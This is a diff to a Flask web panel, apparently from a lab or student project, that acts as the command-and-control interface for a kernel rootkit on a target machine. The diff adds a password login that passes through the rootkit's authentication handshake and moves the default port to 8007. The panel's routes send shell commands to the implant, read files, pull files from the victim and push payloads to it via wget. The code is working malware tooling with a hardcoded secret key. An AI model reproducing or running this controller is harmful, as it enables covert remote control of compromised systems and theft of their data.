@@ -1,15 +1,16 @@
 #!/usr/bin/env python3
 
-from flask import Flask, render_template, request, jsonify, send_from_directory
+from flask import Flask, render_template, request, jsonify, send_from_directory, session, redirect
 import socket
 import os
 import base64
 import tempfile
 import re
+import hashlib
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
-
+app.secret_key = 'clef_secrete_rootkit_2024'
 UPLOAD_FOLDER = '/tmp/flask_uploads'
 
 if not os.path.exists(UPLOAD_FOLDER):
@@ -17,6 +18,136 @@ if not os.path.exists(UPLOAD_FOLDER):
 
 @app.route('/')
 def index():
+    if not session.get('authenticated'):
+        return auth_page()
+    return main_interface()
+
+def auth_page():
+    return '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Authentification Rootkit</title>
+        <style>
+            body {
+                font-family: 'Courier New', monospace;
+                background-color: #000;
+                color: #0f0;
+                margin: 0;
+                padding: 0;
+                height: 100vh;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+            .auth-container {
+                background-color: #111;
+                border: 2px solid #0f0;
+                padding: 30px;
+                border-radius: 10px;
+                text-align: center;
+                min-width: 400px;
+            }
+            .auth-title {
+                color: #f00;
+                font-size: 24px;
+                margin-bottom: 20px;
+                text-shadow: 0 0 10px #f00;
+            }
+            .auth-input {
+                width: 100%;
+                padding: 10px;
+                background-color: #000;
+                border: 1px solid #0f0;
+                color: #0f0;
+                font-family: 'Courier New', monospace;
+                font-size: 16px;
+                margin-bottom: 15px;
+                box-sizing: border-box;
+            }
+            .auth-button {
+                width: 100%;
+                padding: 10px;
+                background-color: #0f0;
+                border: none;
+                color: #000;
+                font-family: 'Courier New', monospace;
+                font-size: 16px;
+                font-weight: bold;
+                cursor: pointer;
+            }
+            .error-message {
+                color: #f00;
+                margin-top: 10px;
+                display: none;
+            }
+            .step {
+                margin-bottom: 10px;
+                color: #ff0;
+                font-size: 14px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="auth-container">
+            <div class="auth-title">☠️ ROOTKIT ACCESS ☠️</div>
+            <div class="step">Étape 1: Configuration de la connexion</div>
+            
+            <form id="auth-form">
+                <input type="text" id="target-ip" class="auth-input" placeholder="Adresse IP cible" value="10.0.2.6" required>
+                <input type="text" id="target-port" class="auth-input" placeholder="Port" value="8007" required>
+                <input type="password" id="password" class="auth-input" placeholder="Mot de passe rootkit" required>
+                <button type="submit" class="auth-button">CONNECTER ET AUTHENTIFIER</button>
+            </form>
+            
+            <div id="error-msg" class="error-message">Erreur de connexion ou mot de passe incorrect !</div>
+        </div>
+        
+        <script>
+            document.getElementById('auth-form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const ip = document.getElementById('target-ip').value;
+                const port = document.getElementById('target-port').value;
+                const password = document.getElementById('password').value;
+                
+                document.getElementById('error-msg').style.display = 'none';
+                document.querySelector('.auth-button').textContent = 'CONNEXION EN COURS...';
+                
+                fetch('/authenticate', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        ip: ip,
+                        port: port,
+                        password: password
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        window.location.reload();
+                    } else {
+                        document.getElementById('error-msg').style.display = 'block';
+                        document.getElementById('error-msg').textContent = data.error || 'Erreur de connexion ou mot de passe incorrect !';
+                        document.querySelector('.auth-button').textContent = 'CONNECTER ET AUTHENTIFIER';
+                        document.getElementById('password').value = '';
+                    }
+                })
+                .catch(error => {
+                    document.getElementById('error-msg').style.display = 'block';
+                    document.getElementById('error-msg').textContent = 'Erreur de connexion !';
+                    document.querySelector('.auth-button').textContent = 'CONNECTER ET AUTHENTIFIER';
+                });
+            });
+            
+            document.getElementById('target-ip').focus();
+        </script>
+    </body>
+    </html>
+    '''
+
+def main_interface():
     return '''
     <!DOCTYPE html>
     <html>
@@ -268,7 +399,7 @@ def index():
             
             <div class="config-panel">
                 <input type="text" id="ip" placeholder="Adresse IP" value="10.0.2.6">
-                <input type="text" id="port" placeholder="Port" value="8005">
+                <input type="text" id="port" placeholder="Port" value="8007">
                 <button onclick="testFunction()">Connecter</button>
             </div>
             
@@ -315,42 +446,42 @@ def index():
         <script>
             let modeActuel = 'commande';
             let connecte = false;
-            let port8005Status = false;
+            let port8007Status = false;
             
             function updateClock() {
                 const now = new Date();
                 let timeText = now.toLocaleTimeString();
                 
-                if (port8005Status) {
-                    timeText += " | Port 8005: <span style='color: #0f0;'>OUVERT</span>";
+                if (port8007Status) {
+                    timeText += " | Port 8007: <span style='color: #0f0;'>OUVERT</span>";
                 } else {
-                    timeText += " | Port 8005: <span style='color: #f00;'>FERMÉ</span>";
+                    timeText += " | Port 8007: <span style='color: #f00;'>FERMÉ</span>";
                 }
                 
                 document.getElementById('time').innerHTML = timeText;
             }
             
-            function verifierPort8005() {
+            function verifierPort8007() {
                 const ip = document.getElementById('ip').value;
                 
                 fetch('/api/verifier_port', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ip: ip, port: 8005})
+                    body: JSON.stringify({ip: ip, port: 8007})
                 })
                 .then(response => response.json())
                 .then(data => {
-                    port8005Status = data.ouvert;
+                    port8007Status = data.ouvert;
                     updateClock();
                 })
                 .catch(error => {
-                    port8005Status = false;
+                    port8007Status = false;
                     updateClock();
                 });
             }
             
-            setInterval(verifierPort8005, 5000);
-            setTimeout(verifierPort8005, 1000);
+            setInterval(verifierPort8007, 5000);
+            setTimeout(verifierPort8007, 1000);
             setInterval(updateClock, 1000);
             updateClock();
             
@@ -537,7 +668,7 @@ def index():
                             afficherResultat(`Upload via WGET: ${file.name}\\nDestination: ${targetPath}\\n\\nEtape 1/2: Fichier stocké sur serveur\\nURL: ${data.download_url}\\n\\nEtape 2/2: Téléchargement via wget...`);
                             
                             const ip = document.getElementById('ip').value;
-                            const port = document.getElementById('port').value || '8005';
+                            const port = document.getElementById('port').value || '8007';
                             
                             fetch('/api/wget_download', {
                                 method: 'POST',
@@ -578,7 +709,7 @@ def index():
                 if (!filePath) return;
                 
                 const ip = document.getElementById('ip').value;
-                const port = document.getElementById('port').value || '8005';
+                const port = document.getElementById('port').value || '8007';
                 
                 afficherResultat(`Download: ${filePath}\\nVérification et téléchargement...`);
                 
@@ -613,7 +744,7 @@ def index():
             
             function testFichiers() {
                 const ip = document.getElementById('ip').value;
-                const port = document.getElementById('port').value || '8005';
+                const port = document.getElementById('port').value || '8007';
                 
                 fetch('/api/commande_rootkit', {
                     method: 'POST',
@@ -643,7 +774,7 @@ def index():
 def verifier_port():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8005))
+    port = int(data.get('port', 8007))
     
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -658,11 +789,60 @@ def verifier_port():
     except Exception as e:
         return jsonify({"ouvert": False, "erreur": str(e)})
 
+@app.route('/authenticate', methods=['POST'])
+def authenticate():
+    data = request.json
+    ip = data.get('ip')
+    port = int(data.get('port', 8007))
+    password = data.get('password')
+    
+    # Tester l'authentification directement avec le kernel
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(10)
+        s.connect((ip, port))
+        
+        # Attendre AUTH_REQUIRED
+        try:
+            initial_response = s.recv(1024).decode()
+            if initial_response == "AUTH_REQUIRED":
+                # Envoyer le mot de passe saisi par l'utilisateur
+                s.send(f"AUTH {password}".encode())
+                
+                # Recevoir la réponse
+                auth_response = s.recv(1024).decode()
+                s.close()
+                
+                if auth_response == "AUTH_OK":
+                    session['authenticated'] = True
+                    session['user_password'] = password
+                    session['target_ip'] = ip
+                    session['target_port'] = port
+                    return jsonify({"success": True})
+                else:
+                    return jsonify({"success": False, "error": "Mot de passe incorrect"})
+            else:
+                s.close()
+                return jsonify({"success": False, "error": "Le rootkit ne demande pas d'authentification"})
+        except socket.timeout:
+            s.close()
+            return jsonify({"success": False, "error": "Timeout - pas de réponse du rootkit"})
+            
+    except ConnectionRefusedError:
+        return jsonify({"success": False, "error": f"Connexion refusée sur {ip}:{port}"})
+    except Exception as e:
+        return jsonify({"success": False, "error": f"Erreur de connexion: {str(e)}"})
+
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect('/')
+
 @app.route('/api/executer', methods=['POST'])
 def executer():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8005))
+    port = int(data.get('port', 8007))
     commande = data.get('commande')
     
     resultat = envoyer_commande(ip, port, "EXEC " + commande)
@@ -672,7 +852,7 @@ def executer():
 def lire():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8005))
+    port = int(data.get('port', 8007))
     chemin = data.get('chemin')
     
     resultat = envoyer_commande(ip, port, "LIRE " + chemin)
@@ -722,7 +902,7 @@ def download_file_serve(filename):
 def download_file_from_target():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8005))
+    port = int(data.get('port', 8007))
     file_path = data.get('file_path')
     
     if not file_path:
@@ -803,7 +983,7 @@ def download_file_from_target():
 def wget_download():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8005))
+    port = int(data.get('port', 8007))
     download_url = data.get('download_url')
     target_path = data.get('target_path', '/tmp/')
     method = data.get('method', 'wget')
@@ -828,7 +1008,7 @@ def wget_download():
 def commande_rootkit():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8005))
+    port = int(data.get('port', 8007))
     commande = data.get('commande')
     
     try:
@@ -854,21 +1034,48 @@ def commande_rootkit():
         return jsonify({"resultat": f"Erreur: {str(e)}"})
 
 def envoyer_commande(ip, port, message):
+    # Utiliser les paramètres de la session si pas fournis
+    if not ip or not port:
+        ip = session.get('target_ip', ip)
+        port = session.get('target_port', port)
+    
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
+        s.settimeout(15)
         s.connect((ip, int(port)))
+        
+        # Vérifier si une authentification est requise
+        s.settimeout(5)
+        try:
+            initial_response = s.recv(1024).decode()
+            if initial_response == "AUTH_REQUIRED":
+                # Utiliser le mot de passe de la session
+                password = session.get('user_password', '')
+                s.send(f"AUTH {password}".encode())
+                
+                auth_response = s.recv(1024).decode()
+                if auth_response != "AUTH_OK":
+                    s.close()
+                    return f"Erreur: Authentification échouée - {auth_response}"
+        except socket.timeout:
+            pass
+        
         s.send(message.encode())
         
         reponse = b""
-        chunk = s.recv(5000)
-        while chunk:
-            reponse += chunk
+        consecutive_empty = 0
+        
+        while consecutive_empty < 3:
             try:
-                s.settimeout(0.5)
-                chunk = s.recv(5000)
+                s.settimeout(3)
+                chunk = s.recv(16384)
+                if chunk:
+                    reponse += chunk
+                    consecutive_empty = 0
+                else:
+                    consecutive_empty += 1
             except socket.timeout:
-                break
+                consecutive_empty += 1
         
         s.close()
         return reponse.decode()
